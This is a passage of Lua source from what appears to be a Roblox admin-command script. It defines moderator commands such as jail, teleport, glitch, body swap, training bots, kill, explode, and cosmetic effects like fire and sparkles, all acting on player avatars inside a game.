for i, v in pairs(plrz) do
set.Remote(v,'Function','Noclip','off')
end
end)
 
set.MakeCommand('Jails the target player(s), removing their tools until they are un-jailed',2,set.Prefix,{'jail','imprison'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v.Character and v.Character:FindFirstChild("Torso") then
local cf = v.Character.Torso.CFrame + Vector3.new(0,1,0)
local origpos = v.Character.Torso.Position
local mod = Instance.new("Model", game.Workspace) mod.Name = v.Name .. " Epix Jail" table.insert(set.objects, mod)
local value = Instance.new('StringValue',mod) value.Name='Player' value.Value=v.Name
local top = Instance.new("Part", mod) top.Locked = true top.formFactor = "Symmetric" top.Size = Vector3.new(6,1,6) top.TopSurface = 0 top.BottomSurface = 0 top.Anchored = true top.BrickColor = BrickColor.new("Really black") top.CFrame = cf * CFrame.new(0,-3.5,0)
set.JailedTools[v.Name]=Instance.new('Model')
local bottom = top:Clone() bottom.Transparency = 1 bottom.Parent = mod bottom.CFrame = cf * CFrame.new(0,3.5,0)
local front = top:Clone() front.Transparency = 1 front.Reflectance = 0 front.Parent = mod front.Size = Vector3.new(6,6,1) front.CFrame = cf * CFrame.new(0,0,-3)
local back = front:Clone() back.Transparency = 1 back.Parent = mod back.CFrame = cf * CFrame.new(0,0,3)
local right = front:Clone() right.Transparency = 1 right.Parent = mod right.Size = Vector3.new(1,6,6) right.CFrame = cf * CFrame.new(3,0,0)
local left = right:Clone() left.Transparency = 1 left.Parent = mod left.CFrame = cf * CFrame.new(-3,0,0)
local msh = Instance.new("BlockMesh", front) msh.Scale = Vector3.new(1,1,0)
local msh2 = msh:Clone() msh2.Parent = back
local msh3 = msh:Clone() msh3.Parent = right msh3.Scale = Vector3.new(0,1,1)
local msh4 = msh3:Clone() msh4.Parent = left
local brick = Instance.new('Part',mod)
local box = Instance.new('SelectionBox',brick)
box.Adornee=brick
box.Color=BrickColor.new('White')
brick.Anchored=true
brick.CanCollide=false
brick.Transparency=1
brick.Size=Vector3.new(5,7,5)
brick.CFrame=cf--*CFrame.new(0,-1,0)
v.Character.Torso.CFrame = cf
for l,k in pairs(v.Backpack:children()) do
        if k and k.ClassName=='Tool' or k.ClassName=='HopperBin' then
                k.Parent=set.JailedTools[v.Name]
        end
end
coroutine.wrap(function()
repeat
        local player=game:service('Players'):FindFirstChild(v.Name)
        if not player then return end
        local torso=player.Character:FindFirstChild('Torso')
        if not torso then return end
        if not set.JailedTools[v.Name] or set.JailedTools[v.Name]==nil then set.JailedTools[v.Name]=Instance.new('Model') end
        for l,k in pairs(player.Backpack:children()) do
                if k and k.ClassName=='Tool' or k.ClassName=='HopperBin' then
                        k.Parent=set.JailedTools[v.Name]--tools
                end
        end
        if (torso.Position-origpos).magnitude>5 then
                torso.CFrame = cf
        end
        wait()
until not mod or not mod.Parent or set.JailedTools[v.Name]==nil
end)()
end
end)()
end
end)
 
set.MakeCommand('UnJails the target player(s) and returns any tools that were taken from them while jailed',2,set.Prefix,{'unjail','free','release'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
        coroutine.wrap(function()
                if v then
                        for a, jl in pairs(game.Workspace:children()) do
                                if jl.Name == v.Name .. " Epix Jail" then
                                        jl:Destroy()
                                end
                        end
                if set.JailedTools[v.Name] then
                        for j,tewl in pairs(set.JailedTools[v.Name]:children()) do
                                if tewl then
                                        tewl.Parent=v.Backpack
                                end
                        end
                        set.JailedTools[v.Name]=nil
                end
        set.JailedTools[v.Name]=nil
end
end)()
end
end)
 
set.MakeCommand('Gives the target player(s) a little chat gui, when used will let them chat using dialog bubbles',2,set.Prefix,{'bchat','dchat','bubblechat','dialogchat'},{'player','color(red/green/blue)'},2,function(plr,args)
        local color=Enum.ChatColor.Red
        if not args[2] then
                color=Enum.ChatColor.Red
        elseif args[2]:lower()=='red' then
                color=Enum.ChatColor.Red
        elseif args[2]:lower()=='green' then
                color=Enum.ChatColor.Green
        elseif args[2]:lower()=='blue' then
                color=Enum.ChatColor.Blue
        end
        for i,v in pairs(set.GetPlayers(plr,(args[1] or plr.Name))) do
                set.Remote(v,"Function","BubbleChat",color)
        end
end)
 
set.MakeCommand('Shows you where the target player(s) is/are',2,set.Prefix,{'track','trace','find'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                set.Remote(plr,'Function','Find','on',v)
        end
end)
 
set.MakeCommand('Stops tracking the target player(s)',2,set.Prefix,{'untrack','untrace','unfind'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                set.Remote(plr,'Function','Find','off',v)
        end
end)
 
set.MakeCommand('Makes the target player(s)\'s character teleport back and forth rapidly, quite trippy, makes bricks appear to move as the player turns their character',2,set.Prefix,{'glitch','glitchdisorient','glitch1','gd'},{'player','intensity'},2,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr, args[1])) do
                local num=args[2] or 15
                set.Remote(v,'Function','Glitch','trippy',num)
        end
end)
 
set.MakeCommand('The same as gd but less trippy, teleports the target player(s) back and forth in the same direction, making two ghost like images of the game',2,set.Prefix,{'glitch2','glitchghost','gg'},{'player','intensity'},2,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr, args[1])) do
                local num=args[2] or 150
                set.Remote(v,'Function','Glitch','ghost',num)
        end
end)
 
set.MakeCommand('Kinda like gd, but teleports the player to four points instead of two',2,set.Prefix,{'vibrate','glitchvibrate','gv'},{'player','intensity'},2,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr, args[1])) do
                local num=args[2] or 0.1
                set.Remote(v,'Function','Glitch','vibrate',num)
        end
end)
 
set.MakeCommand('UnGlitchs the target player(s)',2,set.Prefix,{'unglitch','unglitchghost','ungd','ungg','ungv'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr, args[1])) do
                set.Remote(v,'Function','Glitch','off')
        end
end)
 
set.MakeCommand('Shows you the current message of the day',0,set.AnyPrefix,{'motd','messageoftheday','daymessage'},{},0,function(plr,args)
        set.PM('Message of the Day',plr,game:service('MarketplaceService'):GetProductInfo(set.MessageOfTheDayID).Description)
end)
 
set.MakeCommand('Makes a clone of target player(s)\'s character and parents their real on to their local camera, no one can see them until they are unphased',2,set.Prefix,{'phase'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr, args[1])) do
                coroutine.wrap(function()
                for k,m in pairs(workspace:children()) do if m.Name==v.Name and m:FindFirstChild('FakeCharPhased') then m:Destroy() end end
                set.Remote(v,'Function','Phase',false)
                wait(set.Ping(v)+0.3)
                for a,obj in pairs(v.Character:children()) do if obj.Name~='HumanoidRootPart' then if obj:IsA("BasePart") then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end end end
                v.Character.Archivable=true
                local hum=v.Character:FindFirstChild('Humanoid')
                local cl=v.Character:clone()
                v.Character.Archivable=false
                pcall(function() cl.Animate:Destroy() end)
                local anim=deps.Animate:clone()
                anim.Parent=cl
                anim.Disabled=false
                local val=Instance.new('StringValue',cl)
                val.Name='FakeCharPhased'
                cl.Parent=workspace
                v.Character.Torso.CFrame=v.Character.Torso.CFrame*CFrame.new(0,0,1)
                for a,obj in pairs(v.Character:children()) do if obj:IsA("BasePart") then obj.Transparency = 1 if obj:findFirstChild("face") then obj.face.Transparency = 1 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 1 end end
                set.Remote(v,'Function','Phase',true)
                repeat wait() until not hum or not hum.Parent or not cl or not cl.Parent
                if cl then cl:Destroy() end
                end)()
        end
end)
 
set.MakeCommand('UnPhases the target player(s)',2,set.Prefix,{'unphase'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr, args[1])) do
                for k,m in pairs(workspace:children()) do if m.Name==v.Name and m:FindFirstChild('FakeCharPhased') then m:Destroy() end end
                set.Remote(v,'Function','Phase',false)
                v.Character:MakeJoints()
                print(v.Character.Humanoid.Health)
                wait(set.Ping(v)+0.3)
                v.Character:MakeJoints()
                print(v.Character.Humanoid.Health)
                for a,obj in pairs(v.Character:children()) do if obj.Name~='HumanoidRootPart' then if obj:IsA("BasePart") then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end end end
        end
end)
 
set.MakeCommand('Removes the bubble chat gui from the target player(s)',2,set.Prefix,{'unbchat','unbubblechat','undchat','undialogchat'},{'player'},1,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,(args[1] or plr.Name))) do
                set.Remote(v,'Function','BubbleChat','off')
        end
end)
 
set.MakeCommand('Gives the target player(s) tools that are in their StarterPack',2,set.Prefix,{'startertools','starttools'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
for a,q in pairs(game.StarterPack:children()) do q:Clone().Parent = v.Backpack end
end
end))
end
end)
 
set.MakeCommand('Gives the target player(s) a sword',2,set.Prefix,{'sword','givesword'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local sword = Instance.new("Tool", v.Backpack) sword.Name = "Sword"  sword.TextureId = "rbxasset://Textures/Sword128.png"
sword.GripForward = Vector3.new(-1,0,0)
sword.GripPos = Vector3.new(0,0,-1.5)
sword.GripRight = Vector3.new(0,1,0)
sword.GripUp = Vector3.new(0,0,1)
local handle = Instance.new("Part", sword) handle.Name = "Handle" handle.FormFactor = "Plate" handle.Size = Vector3.new(1,.8,4) handle.TopSurface = 0 handle.BottomSurface = 0
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/sword.mesh" msh.TextureId = "rbxasset://textures/SwordTexture.png"
local cl=deps.SwordScript:clone() cl.Parent=sword cl.Disabled=false
end
end))
end
end)
 
set.MakeCommand('Clones the target player(s)',2,set.Prefix,{'clone','cloneplayer'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
v.Character.Archivable = true
local cl = v.Character:Clone()
table.insert(set.objects,cl)
cl.Parent = game.Workspace
cl:MoveTo(v.Character:GetModelCFrame().p)
cl:MakeJoints()
v.Character.Archivable = false
repeat wait() until not cl or not cl.Humanoid or cl.Humanoid.Health<=0
wait(5)
if cl then cl:Destroy() end
end
end)()
end
end)
 
set.MakeCommand('Configurable AIs made for training, :bot me 5 true true true makes 5 bots that attack, stack, and run to players to kill them',2,set.Prefix,{'bot','tbot','trainingbot','bots','robot','robots','dummy','dummys','testdummy','testdummys','dolls','doll'},{'plr','num','walk','attk','swarm','speed','dmg','hp','dist'},9,function(plr,args)
        local walk=false
        if args[3] then if args[3]:lower()=='true' or args[3]:lower()=='yes' then walk=true end end
        local attack=false
        if args[4] then if args[4]:lower()=='true' or args[4]:lower()=='yes' then attack=true end end
        local health=args[8] or 100
        local damage=args[7] or 10
        local walkspeed=args[6] or 20
        local dist=args[9] or 100
        local swarm=false
        if args[5] then if args[5]:lower()=='true' or args[5]:lower()=='yes' then swarm=true end end
        local function makedolls(player)
                local num=args[2] or 1
                local pos=player.Character.Torso.CFrame
                num=tonumber(num)
                if num>50 then num=50 end
                for i=1,num do
                        coroutine.wrap(function()
                                player.Character.Archivable = true
                                local cl = player.Character:Clone()
                                player.Character.Archivable = false
                                table.insert(set.objects,cl)
                                local anim=script['Script Dependencies'].Animate:Clone()
                                anim.Parent=cl
                                anim.Disabled=false
                                cl.Parent = game.Workspace
                                cl.Name='~=Bot=~'
                                if cl:FindFirstChild('Animate') then cl.Animate:Destroy() end
                                cl.Humanoid.MaxHealth=health
                                wait()
                                cl.Humanoid.Health=health
                                cl.Torso.CFrame=pos*CFrame.Angles(0,math.rad(360/num*i),0)*CFrame.new(5+.2*num,0,0)
                                cl:MakeJoints()
                                cl.Humanoid.WalkSpeed=walkspeed
                                for k,f in pairs(cl:children()) do if f.ClassName=='ForceField' then f:Destroy() end end
                                local run=true
                                local thing
                                local target
                                local chasing=false
                                local function find()
                                        for k,n in pairs(game:service('Players'):GetPlayers()) do
                                                coroutine.wrap(function()
                                                        if swarm and not chasing and n:DistanceFromCharacter(cl.Torso.Position) < tonumber(dist) then
                                                                n=n.Character
                                                                if not n:FindFirstChild('Humanoid') or not n:FindFirstChild('Torso') or n.Humanoid.Health>=math.huge or n:FindFirstChild('ForceField') then return end
                                                                target=n.Torso
                                                                chasing=true
                                                                repeat wait() until chasing==false or n.Humanoid.Health<=0 or n.Humanoid.Health>=math.huge or n:FindFirstChild('ForceField') or not n:FindFirstChild('Torso') or not n
                                                                chasing=false
                                                        end
                                                end)()
                                        end
                                end
                                coroutine.wrap(function()
                                        if not cl.Humanoid or not cl.Torso then return end
                                        thing=cl.Torso.Touched:connect(function(hit)
                                                coroutine.wrap(function()
                                                        if attack and run and cl and hit.Parent:FindFirstChild('Humanoid') and hit.Parent:FindFirstChild('Torso') and hit.Parent.Name~='~=Bot=~' then
                                                                if hit.Parent.Humanoid.Health>=math.huge or hit.Parent:FindFirstChild('ForceField') then return end
                                                                hit.Parent.Humanoid.Health=hit.Parent.Humanoid.Health-damage
                                                                target=hit.Parent.Torso
                                                                chasing=true
                                                                repeat wait() until chasing==false or hit.Parent.Humanoid.Health<=0 or hit.Parent.Humanoid.Health>=math.huge or hit.Parent:FindFirstChild('ForceField') or not hit.Parent:FindFirstChild('Torso') or not hit.Parent
                                                                chasing=false
                                                        end
                                                end)()
                                               
                                        end)
                                        repeat
                                                if not walk then return end
                                                if cl.Humanoid.Sit then
                                                        cl.Humanoid.Jump=true
                                                        cl.Humanoid.Sit=false
                                                end
                                                if chasing then
                                                        wait()
                                                        cl.Humanoid.WalkToPoint=target.Position
                                                        if math.abs(cl.Torso.Position.Y-target.Position.Y)>7 then
                                                                cl.Humanoid.Jump=true
                                                        end
                                                else
                                                        cl.Humanoid.WalkToPoint=Vector3.new(math.random(cl.Torso.Position.X-100,cl.Torso.Position.X+100),cl.Torso.Position.Y,math.random(cl.Torso.Position.Z-100,cl.Torso.Position.Z+100))
                                                        wait(1)
                                                end
                                                pcall(find)
                                                wait()
                                        until not cl or not cl.Humanoid or cl.Humanoid.Health<=0 or not run
                                end)()
                                repeat wait() until not cl or not cl.Humanoid or cl.Humanoid.Health<=0 or not run
                                run=false
                                pcall(function() thing:disconnect() end)
                                wait(2)
                                pcall(function() if cl then cl:Destroy() end end)
                        end)()
                end
        end
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                makedolls(v)
        end
end)
 
set.MakeCommand('Gives you a tool that lets you click where you want the target player to stand, hold r to rotate them',2,set.Prefix,{'clickteleport','teleporttoclick','ct','clicktp','forceteleport','ctp','ctt'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local tool=Instance.new('HopperBin',plr.Backpack)
local cl=deps.ClickToTool:clone()
cl.Target.Value=v.Name
cl.Mode.Value='Teleport'
cl.Parent=tool
cl.Disabled=false
end)()
end
end)
 
set.MakeCommand('Gives you a tool that lets you click where you want the target player to walk, hold r to rotate them',2,set.Prefix,{'clickwalk','cw','ctw','forcewalk','walktool','walktoclick','clickcontrol','forcewalk'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local tool=Instance.new('HopperBin',plr.Backpack)
local cl=deps.ClickToTool:clone()
cl.Target.Value=v.Name
cl.Mode.Value='Walk'
cl.Parent=tool
cl.Disabled=false
end)()
end
end)
 
set.MakeCommand('Swaps player1\'s and player2\'s bodies and tools',2,set.Prefix,{'bodyswap','bodysteal','bswap'},{'player1','player2'},2,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
        for i2,v2 in pairs(set.GetPlayers(plr,args[2])) do
                local temptools=Instance.new('Model')
                local tempcloths=Instance.new('Model')
                local vpos=v.Character.Torso.CFrame
                local v2pos=v2.Character.Torso.CFrame
                local vface=v.Character.Head.face
                local v2face=v2.Character.Head.face
                vface.Parent=v2.Character.Head
                v2face.Parent=v.Character.Head
                for k,p in pairs(v.Character:children()) do
                        if p:IsA('BodyColors') or p:IsA('CharacterMesh') or p:IsA('Pants') or p:IsA('Shirt') or p:IsA('Hat') then
                                p.Parent=tempcloths
                        elseif p:IsA('Tool') then
                                p.Parent=temptools
                        end
                end    
                for k,p in pairs(v.Backpack:children()) do
                        p.Parent=temptools
                end
                for k,p in pairs(v2.Character:children()) do
                        if p:IsA('BodyColors') or p:IsA('CharacterMesh') or p:IsA('Pants') or p:IsA('Shirt') or p:IsA('Hat') then
                                p.Parent=v.Character
                        elseif p:IsA('Tool') then
                                p.Parent=v.Backpack
                        end
                end    
                for k,p in pairs(tempcloths:children()) do
                        p.Parent=v2.Character
                end    
                for k,p in pairs(v2.Backpack:children()) do
                        p.Parent=v.Backpack
                end
                for k,p in pairs(temptools:children()) do
                        p.Parent=v2.Backpack
                end
                v2.Character.Torso.CFrame=vpos
                v.Character.Torso.CFrame=v2pos
        end
        end
end)
 
set.MakeCommand('Lets you take control of the target player',2,set.Prefix,{'control','takeover'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
v.Character.Humanoid.PlatformStand = true
local w = Instance.new("Weld", plr.Character.Torso )
w.Part0 = plr.Character.Torso
w.Part1 = v.Character.Torso  
local w2 = Instance.new("Weld", plr.Character.Head)
w2.Part0 = plr.Character.Head
w2.Part1 = v.Character.Head  
local w3 = Instance.new("Weld", plr.Character:findFirstChild("Right Arm"))
w3.Part0 = plr.Character:findFirstChild("Right Arm")
w3.Part1 = v.Character:findFirstChild("Right Arm")
local w4 = Instance.new("Weld", plr.Character:findFirstChild("Left Arm"))
w4.Part0 = plr.Character:findFirstChild("Left Arm")
w4.Part1 = v.Character:findFirstChild("Left Arm")
local w5 = Instance.new("Weld", plr.Character:findFirstChild("Right Leg"))
w5.Part0 = plr.Character:findFirstChild("Right Leg")
w5.Part1 = v.Character:findFirstChild("Right Leg")
local w6 = Instance.new("Weld", plr.Character:findFirstChild("Left Leg"))
w6.Part0 = plr.Character:findFirstChild("Left Leg")
w6.Part1 = v.Character:findFirstChild("Left Leg")
plr.Character.Head.face:Destroy()
for i, p in pairs(v.Character:children()) do
if p:IsA("BasePart") then
p.CanCollide = false
end
end
for i, p in pairs(plr.Character:children()) do
if p:IsA("BasePart") then
p.Transparency = 1
elseif p:IsA("Hat") then
p:Destroy()
end
end
v.Character.Parent = plr.Character
--v.Character.Humanoid.Changed:connect(function() v.Character.Humanoid.PlatformStand = true end)
end
end)()
end
end)
 
set.MakeCommand('Refreshes the target player(s)\'s character',2,set.Prefix,{'refresh','reset'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local pos=v.Character.Torso.CFrame
local temptools={}
pcall(function() v.Character.Humanoid:UnequipTools() end)
wait()
for k,t in pairs(v.Backpack:children()) do
        if t:IsA('Tool') or t:IsA('Hopperbin') then
                table.insert(temptools,t)
        end
end
v:LoadCharacter()
v.Character.Torso.CFrame=pos
for d,f in pairs(v.Character:children()) do
        if f:IsA('ForceField') then f:Destroy() end
end
wait(1)
v.Backpack:ClearAllChildren()
for l,m in pairs(temptools) do
        m:clone().Parent=v.Backpack
end
end)()
end
end)
 
set.MakeCommand('Kills the target player(s)',2,set.Prefix,{'kill'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v.Character:BreakJoints() end
end)()
end
end)
 
set.MakeCommand('Repsawns the target player(s)',2,set.Prefix,{'respawn'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v:LoadCharacter()
        set.Remote(v,'Function','SetView','reset')
end
end)()
end
end)
 
set.MakeCommand('Rotates the target player(s) by 180 degrees or the angle you set',2,set.Prefix,{'trip'},{'player','angle'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local angle=180 or args[2]
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(0,0,math.rad(angle))
end
end)()
end
end)
 
set.MakeCommand('Stuns the target player(s)',2,set.Prefix,{'stun'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.PlatformStand = true
end
end)()
end
end)
 
set.MakeCommand('UnStuns the target player(s)',2,set.Prefix,{'unstun'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.PlatformStand = false
end
end)()
end
end)
 
set.MakeCommand('Forces the target player(s) to jump',2,set.Prefix,{'jump'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.Jump = true
end
end)()
end
end)
 
set.MakeCommand('Forces the target player(s) to sit',2,set.Prefix,{'sit','seat'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.Sit = true
end
end)()
end
end)
 
set.MakeCommand('Makes the target player(s) invisible',2,set.Prefix,{'invisible'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") then obj.Transparency = 1 if obj:findFirstChild("face") then obj.face.Transparency = 1 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 1 end
end
end
end)()
end
end)
 
set.MakeCommand('Makes the target player(s) visible',2,set.Prefix,{'visible'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") and obj.Name~='HumanoidRootPart' then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end
end
end
end)()
end
end)
 
set.MakeCommand('Locks the target player(s)',2,set.Prefix,{'lock'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr,args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") then obj.Locked = true elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = true end
end
end
end)()
end
end)
 
set.MakeCommand('UnLocks the the target player(s), makes it so you can use btools on them',2,set.Prefix,{'unlock'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") then obj.Locked = false elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = false end
end
end
end)()
end
end)
 
set.MakeCommand('Explodes the target player(s)',2,set.Prefix,{'explode','boom','boomboom'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local ex = Instance.new("Explosion", game.Workspace)
ex.Position = v.Character.Torso.Position
ex.BlastRadius=20
end
end)()
end
end)
 
set.MakeCommand('Makes a PointLight on the target player(s) with the color specified',2,set.Prefix,{'light'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright blue').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local p=Instance.new('PointLight',v.Character.Torso)
table.insert(set.objects,p)
p.Color=str
p.Brightness=5
p.Range=15
end
end)()
end
end)
 
set.MakeCommand('UnLights the target plyer(s)',2,set.Prefix,{'unlight'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for z, cl in pairs(v.Character.Torso:children()) do
        if cl:IsA('PointLight') then cl:Destroy() end
end
end
end)()
end
end)
 
set.MakeCommand('Makes a dialog bubble appear over the target player(s) head with the desired message',-1,set.Prefix,{'talk','maketalk'},{'player','message'},2,function(plr,args)
local message = args[2]
for i,p in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
game:service('Chat'):Chat(p.Character.Head,message,Enum.ChatColor.Blue)
end)()
end
end)
 
set.MakeCommand('Sets the target player(s) on fire, coloring the fire based on what you set',-1,set.Prefix,{'fire','makefire','givefire'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright orange').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local f=Instance.new('Fire',v.Character.Torso)
local p=Instance.new('PointLight',v.Character.Torso)
table.insert(set.objects,f)
table.insert(set.objects,p)
p.Color=str
p.Brightness=5
p.Range=15
f.Color=str
f.SecondaryColor=str
end
end)()
end
end)
 
set.MakeCommand('Puts out the flames on the target player(s)',-1,set.Prefix,{'unfire','removefire','extinguish'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Fire") or cl:IsA('PointLight') then cl:Destroy() end end
end
end)()
end
end)
 
set.MakeCommand('Makes smoke come from the target player(s) with the desired color',-1,set.Prefix,{'smoke','givesmoke'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright orange').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local cl = Instance.new("Smoke", v.Character.Torso) table.insert(set.objects, cl)
cl.Color=str
end
end)()
end
end)
 
set.MakeCommand('Removes smoke from the target player(s)',-1,set.Prefix,{'unsmoke'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Smoke") then cl:Destroy() end end
end
end)()
end
end)
 
set.MakeCommand('Puts sparkles on the target player(s) with the desired color',-1,set.Prefix,{'sparkles'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright blue').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local cl = Instance.new("Sparkles", v.Character.Torso) table.insert(set.objects, cl)
local p=Instance.new('PointLight',v.Character.Torso) table.insert(set.objects, p)
p.Color=str
p.Brightness=5
p.Range=15
cl.SparkleColor=str
end
end)()
end
end)
 
set.MakeCommand('Removes sparkles from the target player(s)',-1,set.Prefix,{'unsparkles'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Sparkles") or cl:IsA('PointLight') then cl:Destroy() end end
end
end)()
end
end)
 
set.MakeCommand('Gives a force field to the target player(s)',2,set.Prefix,{'ff','forcefield'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then Instance.new("ForceField", v.Character) end
end)()
end
end)
 
set.MakeCommand('Removes force fields on the target player(s)',2,set.Prefix,{'unff','unforcefield'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for z, cl in pairs(v.Character:children()) do if cl:IsA("ForceField") then cl:Destroy() end end
end
end)()
end
end)
 
set.MakeCommand('Removes the target player(s)\'s character',2,set.Prefix,{'punish'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
